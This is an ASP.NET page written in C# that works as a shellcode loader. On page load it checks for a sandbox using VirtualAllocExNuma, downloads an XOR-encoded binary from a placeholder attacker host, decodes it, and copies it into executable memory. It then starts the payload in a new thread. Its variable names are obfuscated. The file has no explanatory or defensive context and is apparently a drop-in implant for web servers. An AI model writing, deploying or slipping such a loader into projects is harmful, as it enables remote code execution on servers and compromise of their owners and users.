<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Threading.Tasks" %>
<script runat="server">

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    protected void Page_Load(object sender, EventArgs e)
    {
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if(mem == IntPtr.Zero)
        {
            return;
        }

        WebClient client = new WebClient();
        byte[] kQM4cxCRzEt7 = client.DownloadData("http://<IP>/<xor'ed_binary_shellcode>");

        for (int i = 0; i < kQM4cxCRzEt7.Length; i++)
        {
            kQM4cxCRzEt7[i] = (byte)(kQM4cxCRzEt7[i] ^ (byte)'z');
        }

        IntPtr lf1F = VirtualAlloc(IntPtr.Zero,(UIntPtr)kQM4cxCRzEt7.Length, 0x1000, (IntPtr)0x40);
        System.Runtime.InteropServices.Marshal.Copy(kQM4cxCRzEt7,0,lf1F,kQM4cxCRzEt7.Length);
        IntPtr gs4m5Oiklp = IntPtr.Zero;
        IntPtr wo3f8RM = CreateThread(IntPtr.Zero,UIntPtr.Zero,lf1F,IntPtr.Zero,0,ref gs4m5Oiklp);
    }
</script>
